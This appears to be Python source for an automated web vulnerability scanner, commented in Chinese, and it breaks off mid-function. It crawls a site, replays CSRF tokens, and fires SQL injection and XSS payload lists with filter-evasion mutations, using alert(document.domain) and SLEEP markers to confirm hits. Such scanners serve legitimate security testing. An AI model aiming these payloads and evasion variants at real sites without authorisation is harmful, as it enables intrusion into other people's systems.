# ==============================================================================
# 主动扫描器 v2.0 - 架构级升级
# 架构: Crawler → Endpoint Discovery → Parameter Analyzer → Payload Generator
#       → Request Engine → Response Diff Engine → Browser Verification → Reporter
# ==============================================================================

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, unquote, quote, urlsplit
from playwright.sync_api import sync_playwright
import threading
import time
import re
import html
import json
import random
import statistics
from difflib import SequenceMatcher
from collections import Counter
from typing import Dict, List, Optional, Tuple, Any

# ==============================================================================
# 第一部分：工具方法 / Payload 常量
# ==============================================================================

# SQL Error Strings（严格）
SQL_ERROR_STRINGS = [
    "you have an error in your sql syntax",
    "mysql_fetch", "mysql_num_rows", "mysql_result", "mysql_query",
    "unclosed quotation mark", "quoted string not properly terminated",
    "ora-00933", "ora-01756", "ora-00904", "ora-12704", "ora-00942",
    "microsoft sql server", "unclosed quotation",
    "pg_query", "postgres", "psql:",
    "sqlite3.operationalerror", "sqlite3_error",
    "sqlstate", "syntax error", "division by zero", "invalid identifier",
]

# SQL Payloads - 核心种子
SQL_SEED_TRUE = ["' OR '1'='1", "1 OR 1=1", "\" OR \"1\"=\"1", "' OR 1=1--", "1' OR '1'='1"]
SQL_SEED_FALSE = ["' AND '1'='2", "1 AND 1=2", "\" AND \"1\"=\"2", "' AND 1=2--"]
SQL_SEED_ERROR = ["'", "'\"", "''", "';", "')", "')('"]
SQL_SEED_TIME = ["' AND SLEEP(3)--", "1 AND SLEEP(3)", "1; WAITFOR DELAY '0:0:3'--", "1; SELECT SLEEP(3)--"]

XSS_SEED_BASIC = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "<svg onload=alert(1)>",
]

# ==============================================================================
# 工具方法
# ==============================================================================

def decode_all(text: str) -> str:
    """多层解码：URL → HTML entities → 小写"""
    if not text:
        return ""
    try:
        text = unquote(text)
    except Exception:
        pass
    try:
        text = html.unescape(text)
    except Exception:
        pass
    return text.lower()


def is_text_input(input_type: str) -> bool:
    t = (input_type or "").lower()
    return t in ["text", "search", "url", "email", "password", "", "number"]


def is_skipped_input(input_type: str) -> bool:
    t = (input_type or "").lower()
    return t in ["hidden", "submit", "button", "reset", "image", "file", "select", "radio", "checkbox"]


def is_csrf_field(name: str) -> bool:
    """判断是否为 CSRF / token 字段"""
    if not name:
        return False
    n = name.lower()
    return any(k in n for k in [
        "csrf", "_token", "token", "nonce", "xsrf",
        "anti", "verif", "auth", "security", "form_key",
        "_csrf", "csrf_token", "request_token",
        "user_token", "form_token",
    ])


def similarity_ratio(a: str, b: str) -> float:
    """文本相似度 (0-1)"""
    if not a or not b:
        return 0.0
    return SequenceMatcher(None, a[:20000], b[:20000]).ratio()


# ==============================================================================
# 第二部分：Response Diff Engine - 响应差异分析引擎
# ==============================================================================

class DiffResult:
    def __init__(self,
                 text_similarity: float,
                 dom_tag_diff: int,
                 keyword_diff: set,
                 status_same: bool,
                 redirect_same: bool,
                 content_type_same: bool,
                 length_diff: int):
        self.text_similarity = text_similarity
        self.dom_tag_diff = dom_tag_diff
        self.keyword_diff = keyword_diff
        self.status_same = status_same
        self.redirect_same = redirect_same
        self.content_type_same = content_type_same
        self.length_diff = length_diff

    def is_significant(self) -> bool:
        """是否为显著差异（可能存在布尔盲注）"""
        return (
            self.text_similarity < 0.85  # 文本差异 > 15%
            or self.dom_tag_diff > 5      # DOM 结构变化 > 5 个标签
            or len(self.keyword_diff) > 2  # 出现新关键词
            or not self.status_same       # 状态码变化
        )

    def summary(self) -> str:
        return (f"sim={self.text_similarity:.2f} dom_diff={self.dom_tag_diff} "
                f"new_kws={len(self.keyword_diff)} status_same={self.status_same} "
                f"redirect_same={self.redirect_same} len_diff={self.length_diff}")


class ResponseDiffEngine:
    """
    三向比较引擎：normal_response vs TRUE_payload vs FALSE_payload
    分析维度：文本相似度 / DOM 结构 / 关键字 / 状态码 / redirect / content-type
    """

    def __init__(self, logger=None):
        self.logger = logger
        self._keyword_cache = {}

    def _extract_dom_tags(self, html_text: str) -> List[str]:
        """提取页面所有HTML标签，用于结构比较"""
        if not html_text:
            return []
        try:
            soup = BeautifulSoup(html_text, "html.parser")
            return [tag.name for tag in soup.find_all(True)]
        except Exception:
            return []

    def _extract_keywords(self, text: str) -> set:
        """提取响应中与安全相关的关键词（错误信息/警告/成功信息）"""
        if not text:
            return set()
        keywords = set()
        markers = [
            # SQL相关
            "error", "warning", "mysql", "sql", "syntax", "query", "database",
            # 通用
            "success", "successfully", "invalid", "denied", "forbidden",
            "not found", "missing", "login", "username", "password",
            # XSS相关
            "alert", "script", "onerror", "onload",
        ]
        t = text.lower()
        for k in markers:
            if k in t:
                keywords.add(k)
        return keywords

    def compare_two(self, resp_a, resp_b) -> DiffResult:
        """比较两个响应"""
        text_a = getattr(resp_a, "text", "") or ""
        text_b = getattr(resp_b, "text", "") or ""

        text_sim = similarity_ratio(text_a, text_b)
        tags_a = self._extract_dom_tags(text_a)
        tags_b = self._extract_dom_tags(text_b)
        dom_diff = abs(len(tags_a) - len(tags_b))

        # 统计标签分布差异
        if tags_a and tags_b:
            c1, c2 = Counter(tags_a), Counter(tags_b)
            dom_diff = sum((c1 - c2).values()) + sum((c2 - c1).values())

        kw_a = self._extract_keywords(text_a)
        kw_b = self._extract_keywords(text_b)
        kw_diff = kw_a.symmetric_difference(kw_b)

        status_a = getattr(resp_a, "status_code", 0)
        status_b = getattr(resp_b, "status_code", 0)
        status_same = status_a == status_b

        # 检查重定向
        history_a = len(getattr(resp_a, "history", []))
        history_b = len(getattr(resp_b, "history", []))
        redirect_same = history_a == history_b

        # content-type
        ct_a = ""
        ct_b = ""
        try:
            ct_a = resp_a.headers.get("Content-Type", "")
            ct_b = resp_b.headers.get("Content-Type", "")
        except Exception:
            pass
        ct_same = ct_a.split(";")[0] == ct_b.split(";")[0]

        len_diff = abs(len(text_a) - len(text_b))

        return DiffResult(text_sim, dom_diff, kw_diff, status_same, redirect_same, ct_same, len_diff)

    def three_way_compare(self, normal_resp, true_resp, false_resp) -> Dict[str, Any]:
        """
        核心方法：TRUE vs FALSE vs NORMAL 三向比较
        判断是否存在布尔盲注:
        - TRUE vs NORMAL 差异大
        - TRUE vs FALSE 差异大
        - 但 FALSE vs NORMAL 差异小
        """
        diff_true_vs_false = self.compare_two(true_resp, false_resp)
        diff_true_vs_normal = self.compare_two(true_resp, normal_resp)
        diff_false_vs_normal = self.compare_two(false_resp, normal_resp)

        result = {
            "true_vs_false": diff_true_vs_false,
            "true_vs_normal": diff_true_vs_normal,
            "false_vs_normal": diff_false_vs_normal,
            "likely_blind_sqli": (
                diff_true_vs_false.is_significant()
                and not diff_false_vs_normal.is_significant()
                and diff_true_vs_normal.is_significant()
            ),
            "summary_true_vs_false": diff_true_vs_false.summary(),
            "summary_true_vs_normal": diff_true_vs_normal.summary(),
            "summary_false_vs_normal": diff_false_vs_normal.summary(),
        }

        if self.logger:
            self.logger(f"[DEBUG] Diff True vs False: {diff_true_vs_false.summary()}")
            self.logger(f"[DEBUG] Diff True vs Normal: {diff_true_vs_normal.summary()}")
            self.logger(f"[DEBUG] Diff False vs Normal: {diff_false_vs_normal.summary()}")
            self.logger(f"[DEBUG] Likely blind SQLi: {result['likely_blind_sqli']}")

        return result



# 第三部分：CSRF Token 处理器


class CsrfHandler:
    """
    自动 CSRF Token 处理器：
    - GET 页面时缓存所有 hidden input
    - POST 时自动带上所有 token 字段
    - 支持 user_token / csrf_token / _token / nonce 等常见命名
    """

    def __init__(self, session=None, logger=None):
        self.session = session
        self.logger = logger
        self._page_cache = {}  # url -> (html_text, response)

    def cache_page(self, url: str, response=None, html_text: str = ""):
        """缓存页面用于提取 token"""
        if response is not None:
            self._page_cache[url] = response
        elif html_text:
            class _FakeResp:
                def __init__(self, t):
                    self.text = t
                    self.status_code = 200
                    self.headers = {}
                    self.history = []
            self._page_cache[url] = _FakeResp(html_text)

    def extract_tokens_from_html(self, html_text: str) -> Dict[str, str]:
        """从HTML中提取所有可能的 CSRF / token 字段"""
        tokens = {}
        try:
            soup = BeautifulSoup(html_text, "html.parser")
            inputs = soup.find_all("input")
            for inp in inputs:
                name = inp.get("name", "")
                value = inp.get("value", "")
                if not name:
                    continue
                if is_csrf_field(name) or inp.get("type", "") == "hidden":
                    tokens[name] = value

            # meta tag中的CSRF (现代前端常见)
            metas = soup.find_all("meta")
            for meta in metas:
                name = meta.get("name", "")
                content = meta.get("content", "")
                if name and is_csrf_field(name):
                    tokens[name] = content

        except Exception:
            pass
        return tokens

    def get_tokens_for_url(self, url: str) -> Dict[str, str]:
        """获取指定URL的 CSRF token。如果缓存中没有，会重新 GET"""
        # 先查缓存
        if url in self._page_cache:
            resp = self._page_cache[url]
            return self.extract_tokens_from_html(resp.text)

        if self.session is None:
            return {}

        # 重新 GET 页面提取 token
        try:
            resp = self.session.get(url, timeout=8, allow_redirects=True)
            self.cache_page(url, response=resp)
            return self.extract_tokens_from_html(resp.text)
        except Exception as e:
            if self.logger:
                self.logger(f"[-] 获取 CSRF token 失败: {e}")
            return {}

    def merge_tokens(self, data: Dict[str, Any], url: str) -> Dict[str, Any]:
        """合并 CSRF token 到请求数据"""
        tokens = self.get_tokens_for_url(url)
        if tokens:
            for k, v in tokens.items():
                if k not in data:
                    data[k] = v
        return data

    def clear(self):
        self._page_cache = {}



# 第四部分：Payload Mutation Engine - payload变异引擎


class PayloadMutator:
    """
    自动变异引擎
    SQL: 大小写混淆、注释插入、编码、无引号、宽字符
    XSS: 大小写、HTML实体、Unicode、URL编码、标签变异、属性变异
    """

    # SQL 变异
    SQL_CASE_MUTATIONS = [
        lambda s: s,
        lambda s: s.upper(),
        lambda s: s.lower(),
        lambda s: "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s)),
    ]

    SQL_COMMENT_PATTERNS = [
        "",
        "/**/",
        "/*!*/",
        "/*!00000*/",
    ]

    XSS_TAG_VARIANTS = [
        "<script", "<Script", "<SCRIPT",
        "<img", "<IMG", "<svg", "<SVG",
        "<iframe", "<IFRAME", "<body", "<BODY",
        "<input", "<INPUT", "<details",
    ]

    XSS_EVENT_VARIANTS = [
        "onerror", "onload", "onclick", "onmouseover",
        "onfocus", "onblur", "oninput", "onchange",
    ]

    def mutate_sql(self, seed_payload: str) -> List[str]:
        """SQL payload 多维度变异，返回变异列表"""
        mutations = set()
        mutations.add(seed_payload)

        # 大小写变异
        for m in self.SQL_CASE_MUTATIONS:
            try:
                mutations.add(m(seed_payload))
            except Exception:
                pass

        # 注释插入（UNION SELECT → UN/**/ION SE/**/LECT）
        if "union" in seed_payload.lower():
            for cp in self.SQL_COMMENT_PATTERNS:
                if cp:
                    m = seed_payload.replace("UNION", f"UN{cp}ION").replace("union", f"un{cp}ion")
                    m = m.replace("SELECT", f"SE{cp}LECT").replace("select", f"se{cp}lect")
                    mutations.add(m)

        # 编码: URL编码（部分字符）
        try:
            encoded = quote(seed_payload)
            if encoded != seed_payload:
                mutations.add(encoded)
        except Exception:
            pass

        # 无引号版本（针对数字型注入）
        try:
            noquote = seed_payload.replace("'", "")
            if noquote != seed_payload and noquote:
                mutations.add(noquote)
        except Exception:
            pass

        # 双引号版本
        try:
            doubleq = seed_payload.replace("'", '"')
            if doubleq != seed_payload:
                mutations.add(doubleq)
        except Exception:
            pass

        # 宽字符
        try:
            mutations.add("\xbf\x27" + seed_payload.replace("'", "") + "\xbf\x27")
        except Exception:
            pass

        return list(mutations)

    def mutate_xss(self, seed_payload: str) -> List[str]:
        """XSS payload 多维度变异"""
        mutations = set()
        mutations.add(seed_payload)

        lower = seed_payload.lower()

        # 1. 大小写变体
        mutations.add(seed_payload.upper())
        mutations.add(seed_payload.lower())

        # 2. HTML 实体编码部分字符
        try:
            encoded = seed_payload.replace("<", "&lt;").replace(">", "&gt;")
            # 仅对属性场景有效
            attr_encoded = seed_payload.replace("\"", "&quot;").replace("'", "&#39;")
            mutations.add(attr_encoded)
        except Exception:
            pass

        # 3. Unicode 编码 (部分字符)
        try:
            unicode_payload = seed_payload.replace("<", "\\u003c").replace(">", "\\u003e")
            mutations.add(unicode_payload)
        except Exception:
            pass

        # 4. URL double-encoding
        try:
            double = quote(quote(seed_payload))
            mutations.add(double)
        except Exception:
            pass

        # 5. 标签变体: 把 <script>alert(1)</script> 换成 <img onerror...>
        if "<script" in lower:
            # 生成多种标签版本
            for tag in ["img", "svg", "iframe", "body", "input"]:
                for evt in self.XSS_EVENT_VARIANTS:
                    m = f'<{tag} src=x {evt}=alert(1)>'
                    mutations.add(m)

        # 6. 属性上下文变异: "><script...>
        if "\"" in seed_payload:
            mutations.add(seed_payload.replace("\"", "'"))
            mutations.add(seed_payload.replace("\"", ""))

        # 7. 空格替换: 用 /\t\n 等替换空格
        if " " in seed_payload:
            mutations.add(seed_payload.replace(" ", "/"))
            mutations.add(seed_payload.replace(" ", "\t"))
            mutations.add(seed_payload.replace(" ", "\n"))

        # 8. 拆分变异: <scr<script>ipt>
        if "<script" in lower:
            mutations.add("<scr<script>ipt>alert(1)</scr</script>ipt>")

        # 9. 纯文本 JS 注入场景: ");alert(1);//
        try:
            mutations.add("\");alert(1);//")
            mutations.add("');alert(1);//")
            mutations.add("`);alert(1);//")
        except Exception:
            pass

        return list(mutations)

    def generate_sql_true_payloads(self, max_count: int = 15) -> List[str]:
        """生成 TRUE 条件 payload 列表（含变异）"""
        result = []
        for seed in SQL_SEED_TRUE:
            result.extend(self.mutate_sql(seed))
        # 去重并限制数量
        seen = set()
        unique = []
        for p in result:
            if p and p not in seen:
                seen.add(p)
                unique.append(p)
                if len(unique) >= max_count:
                    break
        return unique

    def generate_sql_error_payloads(self, max_count: int = 10) -> List[str]:
        """生成错误触发 payload"""
        result = []
        for seed in SQL_SEED_ERROR:
            result.extend(self.mutate_sql(seed))
        seen = set()
        unique = []
        for p in result:
            if p and p not in seen:
                seen.add(p)
                unique.append(p)
                if len(unique) >= max_count:
                    break
        return unique

    def generate_xss_payloads(self, context: str = "html", max_count: int = 15) -> List[str]:
        """根据上下文生成 XSS payload"""
        result = []
        for seed in XSS_SEED_BASIC:
            result.extend(self.mutate_xss(seed))

        # 上下文相关的额外 payload
        if context == "attribute":
            # 注入在HTML属性中: <input value="{INJECT}">
            result.extend([
                "\" onerror=alert(1) x=\"",
                "\" onmouseover=alert(1) x=\"",
                "' onerror=alert(1) x='",
                "\" autofocus onfocus=alert(1) x=\"",
            ])
        elif context == "js_string":
            # 注入在JS字符串中: var x = "{INJECT}"
            result.extend([
                "\";alert(1);//",
                "');alert(1);//",
                "\"\\nalert(1);//",
                "`-alert(1)-`",
                "${alert(1)}",
            ])
        elif context == "url":
            # 注入在URL参数中
            result.extend([
                "javascript:alert(1)",
                "\"> <img src=x onerror=alert(1)>",
            ])

        seen = set()
        unique = []
        for p in result:
            if p and p not in seen:
                seen.add(p)
                unique.append(p)
                if len(unique) >= max_count:
                    break
        return unique



# 第五部分：自动爬虫 - Endpoint Discovery


class Crawler:
    """
    自动发现目标网站的端点:
    - <a href> 链接
    - <form> 表单
    - <script> 中的 fetch/axios/API routes
    - 页面内的 /api/ 等路径
    """

    API_PATH_PATTERNS = [
        r"/api/[a-zA-Z0-9_\-/]+",
        r"/v\d+/[a-zA-Z0-9_\-/]+",
        r"/graphql",
        r"/jsonrpc",
        r"/rpc/[a-zA-Z0-9_]+",
    ]

    JS_ENDPOINT_PATTERNS = [
        r'''fetch\(['"`]([^'"`]+)['"`]''',
        r'''axios\.(?:get|post|put|delete|patch)\(['"`]([^'"`]+)['"`]''',
        r'''URL:\s*['"`]([^'"`]+)['"`]''',
        r'''url:\s*['"`]([^'"`]+)['"`]''',
        r'''/[a-z_]+/[a-z_]+\.json''',
    ]

    def __init__(self, session=None, logger=None, max_depth: int = 1, max_urls: int = 20):
        self.session = session
        self.logger = logger
        self.max_depth = max_depth
        self.max_urls = max_urls

    def discover(self, start_url: str) -> Dict[str, List]:
        """
        返回: {
            "links": [...],
            "forms": [...],
            "js_endpoints": [...],
            "api_paths": [...],
        }
        """
        result = {"links": set(), "forms": [], "js_endpoints": set(), "api_paths": set()}
        visited = set()

        self._crawl_recursive(start_url, 0, visited, result)

        # set -> list
        for k in ["links", "js_endpoints", "api_paths"]:
            result[k] = list(result[k])

        if self.logger:
            self.logger(f"[*] 爬虫发现: 链接={len(result['links'])} 表单={len(result['forms'])} "
                       f"JS端点={len(result['js_endpoints'])} API路径={len(result['api_paths'])}")

        return result

    def _crawl_recursive(self, url: str, depth: int, visited: set, result: Dict):
        if depth > self.max_depth:
            return
        if url in visited:
            return
        if len(visited) >= self.max_urls:
            return

        visited.add(url)
        if self.logger:
            self.logger(f"[Crawler] 深度 {depth}: {url[:80]}")

        try:
            resp = self.session.get(url, timeout=8, allow_redirects=True) if self.session else None
        except Exception:
            return

        if resp is None or resp.status_code >= 400:
            return

        text = resp.text or ""

        # 1. 提取 <a href> 链接（同域）
        try:
            soup = BeautifulSoup(text, "html.parser")
            base_host = urlparse(url).netloc
            for a in soup.find_all("a", href=True):
                href = a["href"].strip()
                if not href or href.startswith(("#", "javascript:", "mailto:", "tel:")):
                    continue
                full_url = urljoin(url, href)
                if urlparse(full_url).netloc == base_host:
                    result["links"].add(full_url.split("#")[0])
        except Exception:
            pass

        # 2. 提取表单
        try:
            forms = self._extract_forms_from_html(text, url)
            result["forms"].extend(forms)
        except Exception:
            pass

        # 3. 从 JS 代码中提取 fetch/axios 等端点
        try:
            for pattern in self.JS_ENDPOINT_PATTERNS:
                for match in re.finditer(pattern, text, re.IGNORECASE):
                    ep = match.group(1)
                    if ep:
                        if ep.startswith(("http", "/")):
                            full = urljoin(url, ep) if ep.startswith("/") else ep
                            result["js_endpoints"].add(full)
        except Exception:
            pass

        # 4. 提取 API 路径模式
        try:
            for pattern in self.API_PATH_PATTERNS:
                for match in re.finditer(pattern, text):
                    path = match.group(0)
                    result["api_paths"].add(path)
        except Exception:
            pass

        # 5. 递归爬取部分链接（仅第一层链接）
        if depth < self.max_depth:
            links_to_crawl = list(result["links"])[:5]
            for link in links_to_crawl:
                self._crawl_recursive(link, depth + 1, visited, result)

    def _extract_forms_from_html(self, html_text: str, base_url: str) -> List[Dict]:
        """从HTML提取表单结构"""
        forms = []
        try:
            soup = BeautifulSoup(html_text, "html.parser")
            for form_tag in soup.find_all("form"):
                method = (form_tag.get("method") or "get").lower()
                action = form_tag.get("action") or ""
                form_url = urljoin(base_url, action) if action else base_url

                inputs = []
                for inp in form_tag.find_all(["input", "textarea", "select"]):
                    name = inp.get("name", "")
                    if not name:
                        continue
                    itype = inp.get("type", "text")
                    inputs.append({"name": name, "type": itype, "value": inp.get("value", "")})

                if inputs:
                    forms.append({"url": form_url, "method": method, "inputs": inputs, "source_url": base_url})
        except Exception:
            pass
        return forms



# 第六部分：Request Engine - 请求引擎


class RequestEngine:
    """
    统一请求引擎，自动检测并支持：
    - application/x-www-form-urlencoded (传统表单)
    - application/json (JSON body)
    - multipart/form-data (文件上传)
    """

    def __init__(self, session=None, csrf_handler=None, logger=None):
        self.session = session
        self.csrf_handler = csrf_handler
        self.logger = logger

    def send(self, url: str, method: str, params_or_data: Dict,
             content_type: str = "form", timeout: int = 10):
        """
        content_type: "form" | "json" | "auto"
        """
        method = (method or "get").lower()

        # auto 模式: 简单启发式 - 如果参数名看起来像 JSON 或者值包含特殊字符，用 json
        if content_type == "auto":
            looks_like_api = any(p in url.lower() for p in ["/api", "/v1/", "/v2/", "/graphql", "/json"])
            content_type = "json" if looks_like_api else "form"

        # GET 请求: 用 URL 参数
        if method == "get":
            return self._safe_request("get", url, params=params_or_data, timeout=timeout)

        # POST 请求
        if self.csrf_handler:
            params_or_data = self.csrf_handler.merge_tokens(params_or_data, url)

        if content_type == "json":
            return self._safe_request("post", url, json=params_or_data, timeout=timeout,
                                      headers={"Content-Type": "application/json"})
        elif content_type == "form":
            return self._safe_request("post", url, data=params_or_data, timeout=timeout)
        else:
            return self._safe_request("post", url, data=params_or_data, timeout=timeout)

    def _safe_request(self, method: str, url: str, **kwargs):
        """安全发送请求，处理异常"""
        try:
            if self.session:
                return self.session.request(method, url, allow_redirects=True, **kwargs)
            else:
                return requests.request(method, url, allow_redirects=True, timeout=10,
                                       headers={"User-Agent": "Mozilla/5.0 AI-Safe/2.0"}, **kwargs)
        except Exception as e:
            if self.logger:
                self.logger(f"[-] 请求失败 {method} {url[:60]}: {e}")
            return None



# 第七部分：Parameter Analyzer + Context Detector（升级版）


class ParameterAnalyzer:
    """
    参数分析器 - 精准检测参数反射上下文
    支持 6 种上下文：
    - html:        注入在 HTML 文本内容中（<p>PAYLOAD</p>）
    - attribute:   注入在 HTML 属性值中（<input value="PAYLOAD">）
    - js_string:   注入在 JS 字符串中（var x = "PAYLOAD"）
    - js_code:     注入在 JS 代码中（var x = PAYLOAD;）
    - url:         URL 参数（可能输出到多种位置）
    """

    JS_SINKS = [
        "innerHTML", "outerHTML", "document.write", "document.writeln",
        "eval", "setTimeout", "setInterval", "Function(", "new Function",
        "location.href", "location.replace", "location.assign",
        "window.open",
    ]

    JS_SOURCES = [
        "location.search", "location.hash", "location.href", "location.pathname",
        "document.URL", "document.referrer", "document.cookie",
        "window.name", "localStorage", "sessionStorage",
        "navigator.userAgent",
    ]

    def detect_context(self, response_text: str, reflected_string: str) -> Dict[str, Any]:
        """
        精准检测反射上下文。返回 dict：
        {
            "context": "html" | "attribute" | "js_string" | "js_code" | "url",
            "quote": '"' | "'" | "`" | None,
            "attr_name": "value" | "onclick" | ...,
            "before_text": "...",
            "after_text": "...",
            "confidence": 0.0-1.0,
        }
        """
        result = {
            "context": "html",
            "quote": None,
            "attr_name": None,
            "tag_name": None,
            "before_text": "",
            "after_text": "",
            "confidence": 0.5,
        }

        if not response_text or not reflected_string:
            return result

        needle = reflected_string[:30] if len(reflected_string) > 30 else reflected_string
        pos = response_text.lower().find(needle.lower())
        if pos < 0:
            return result

        before = response_text[max(0, pos - 200):pos]
        after = response_text[pos + len(needle):pos + len(needle) + 200]
        result["before_text"] = before[-100:]
        result["after_text"] = after[:100]

        # ==========================================
        # 1. 是否在 <script> 标签内？
        # ==========================================
        last_script_start = before.rfind("<script")
        last_script_end = before.rfind("</script>")
        in_script = last_script_start > last_script_end

        if in_script:
            js_ctx = self._detect_js_context(before, after)
            if js_ctx:
                result.update(js_ctx)
                result["confidence"] = 0.9
                return result

        # ==========================================
        # 2. 是否在事件处理器属性中（onclick 等）？
        # ==========================================
        event_match = re.search(
            r'(on[a-z]+)\s*=\s*(["\'])([^\2]*?)$',
            before, re.IGNORECASE
        )
        if event_match:
            attr_name = event_match.group(1).lower()
            quote = event_match.group(2)
            close_pos = after.find(quote)
            if close_pos >= 0 or True:  # 事件属性内
                result["context"] = "js_string"
                result["quote"] = quote
                result["attr_name"] = attr_name
                result["confidence"] = 0.85
                return result

        # ==========================================
        # 3. 是否在普通 HTML 属性值中？
        # ==========================================
        attr_ctx = self._detect_attribute_context(before, after)
        if attr_ctx:
            result.update(attr_ctx)
            result["confidence"] = 0.8
            return result

        # ==========================================
        # 4. 默认：HTML 文本上下文
        # ==========================================
        tag_match = re.search(r'<([a-zA-Z][a-zA-Z0-9]*)\b[^>]*>$', before, re.IGNORECASE)
        if tag_match:
            result["tag_name"] = tag_match.group(1).lower()

        result["context"] = "html"
        result["confidence"] = 0.7
        return result

    def _detect_js_context(self, before: str, after: str) -> Optional[Dict]:
        """检测在 JS 中的具体上下文"""
        # 统计引号数量（奇数 = 在字符串中）
        dq = before.count('"')
        sq = before.count("'")
        bt = before.count("`")

        if dq % 2 == 1:
            return {"context": "js_string", "quote": '"'}
        if sq % 2 == 1:
            return {"context": "js_string", "quote": "'"}
        if bt % 2 == 1:
            return {"context": "js_string", "quote": "`"}

        # 检查是否在代码中（反射前是赋值/调用符号）
        before_stripped = before.rstrip()
        code_patterns = [
            r'=\s*$',
            r'\(\s*$',
            r',\s*$',
            r'return\s*$',
            r'&&\s*$',
            r'\|\|\s*$',
        ]
        for pat in code_patterns:
            if re.search(pat, before_stripped):
                return {"context": "js_code", "quote": None}

        # 保守估计：在双引号字符串中
        return {"context": "js_string", "quote": '"'}

    def _detect_attribute_context(self, before: str, after: str) -> Optional[Dict]:
        """检测是否在 HTML 属性值中"""
        # 反射前有 属性名=引号 模式
        attr_pattern = re.search(
            r'([a-zA-Z_:][a-zA-Z0-9_:-]*)\s*=\s*(["\']?)([^\2]*?)$',
            before, re.IGNORECASE
        )
        if not attr_pattern:
            return None

        attr_name = attr_pattern.group(1).lower()
        quote = attr_pattern.group(2) or ""

        if quote:
            close_pos = after.find(quote)
            if close_pos >= 0:
                return {"context": "attribute", "quote": quote, "attr_name": attr_name}
            return None

        # 无引号属性值
        if re.match(r'^[^\s>/]+', after):
            return {"context": "attribute", "quote": "", "attr_name": attr_name}

        return None

    def generate_context_payloads(self, context_info: Dict, max_count: int = 12) -> List[str]:
        """根据上下文信息生成精准的 XSS payload"""
        ctx = context_info.get("context", "html")
        quote = context_info.get("quote", None)
        attr_name = context_info.get("attr_name", "")
        payloads = []

        # === HTML 文本 ===
        if ctx == "html":
            payloads = [
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=alert(document.domain)>",
                "<svg onload=alert(document.domain)>",
                "<iframe onload=alert(document.domain)>",
                "<body onload=alert(document.domain)>",
                "<input autofocus onfocus=alert(document.domain)>",
                "<details open ontoggle=alert(document.domain)>",
                "<img/src=x onerror=alert(document.domain)>",
                "<svg/onload=alert(document.domain)>",
                "<marquee onstart=alert(document.domain)>",
            ]

        # === HTML 属性 ===
        elif ctx == "attribute":
            if attr_name.startswith("on"):
                # 事件属性 → 直接执行 JS
                payloads = [
                    "alert(document.domain)//",
                    "alert(document.domain);",
                    "1;alert(document.domain)//",
                    "${alert(document.domain)}",
                    "alert`document.domain`",
                ]
            elif attr_name in ["href", "src", "action", "formaction", "data"]:
                # URL 属性 → javascript: 协议
                payloads = [
                    "javascript:alert(document.domain)",
                    "JaVaScRiPt:alert(document.domain)",
                    "javascript:/*x*/alert(document.domain)",
                    "data:text/html,<script>alert(document.domain)</script>",
                ]
            elif quote == '"':
                payloads = [
                    '"><script>alert(document.domain)</script>',
                    '"><img src=x onerror=alert(document.domain)>',
                    '" onmouseover="alert(document.domain)" x="',
                    '" autofocus onfocus="alert(document.domain)" x="',
                    '"><svg onload=alert(document.domain)>',
                    '" oninput=alert(document.domain) x="',
                ]
            elif quote == "'":
                payloads = [
                    "'><script>alert(document.domain)</script>",
                    "'><img src=x onerror=alert(document.domain)>",
                    "' onmouseover='alert(document.domain)' x='",
                    "' autofocus onfocus='alert(document.domain)' x='",
                    "'><svg onload=alert(document.domain)>",
                ]
            else:
                # 无引号
                payloads = [
                    "><script>alert(document.domain)</script>",
                    "><img src=x onerror=alert(document.domain)>",
                    " onmouseover=alert(document.domain) x=",
                    " autofocus onfocus=alert(document.domain) x=",
                    " tabindex=1 onfocus=alert(document.domain) x=",
                ]

        # === JS 字符串 ===
        elif ctx == "js_string":
            if quote == '"':
                payloads = [
                    '";alert(document.domain);//',
                    '"+alert(document.domain)+"',
                    '"-alert(document.domain)-"',
                    '";if(!window.__x){alert(document.domain);window.__x=1}//',
                    '"</script><script>alert(document.domain)</script>',
                    '\\\\";alert(document.domain);//',
                ]
            elif quote == "'":
                payloads = [
                    "';alert(document.domain);//",
                    "'+alert(document.domain)+'",
                    "'-alert(document.domain)-'",
                    "';if(!window.__x){alert(document.domain);window.__x=1}//",
                    "'</script><script>alert(document.domain)</script>",
                    "\\';alert(document.domain);//",
                ]
            elif quote == "`":
                payloads = [
                    "`;alert(document.domain);//",
                    "${alert(document.domain)}",
                    "`+alert(document.domain)+`",
                ]
            else:
                payloads = [
                    '";alert(document.domain);//',
                    '"+alert(document.domain)+"',
                    "</script><script>alert(document.domain)</script>",
                ]

        # === JS 代码 ===
        elif ctx == "js_code":
            payloads = [
                "alert(document.domain)//",
                "alert(document.domain);",
                "1;alert(document.domain)",
                "&&alert(document.domain)",
                "||alert(document.domain)",
                "`;alert(document.domain);//",
            ]

        # === URL ===
        elif ctx == "url":
            payloads = [
                "javascript:alert(document.domain)",
                "<script>alert(document.domain)</script>",
                '"><script>alert(document.domain)</script>',
                "';alert(document.domain);//",
            ]

        # 去重 + 限制
        seen = set()
        unique = []
        for p in payloads:
            if p and p not in seen:
                seen.add(p)
                unique.append(p)
                if len(unique) >= max_count:
                    break
        return unique

    def analyze_form(self, form: Dict) -> Dict:
        """分析表单，返回可能的测试点"""
        text_inputs = [i for i in form.get("inputs", []) if not is_skipped_input(i.get("type", ""))]
        csrf_inputs = [i for i in form.get("inputs", []) if is_csrf_field(i.get("name", ""))]
        return {
            "has_csrf": len(csrf_inputs) > 0,
            "text_input_count": len(text_inputs),
            "csrf_fields": [i["name"] for i in csrf_inputs],
            "text_fields": [i["name"] for i in text_inputs],
        }



# 第八部分：Time-based Blind SQLi - 时间盲注（统计方法）


class TimeBlindAnalyzer:
    """
    时间盲注优化：多次采样 + 统计方法
    - baseline: N 次正常请求的响应时间均值 + 标准差
    - test_payload: N 次注入请求的响应时间均值 + 标准差
    - 显著性检验: test_mean > baseline_mean + 2 * std_dev 且差值 > 2 秒
    """

    def __init__(self, session=None, logger=None):
        self.session = session
        self.logger = logger

    def measure_times(self, url: str, method: str, params: Dict,
                       content_type: str = "form", samples: int = 3, sleep_seconds: int = 3) -> List[float]:
        """多次采样测量响应时间"""
        times = []
        for i in range(samples):
            try:
                start = time.time()
                if self.session:
                    if method.lower() == "get":
                        self.session.get(url, params=params, timeout=15, allow_redirects=True)
                    elif content_type == "json":
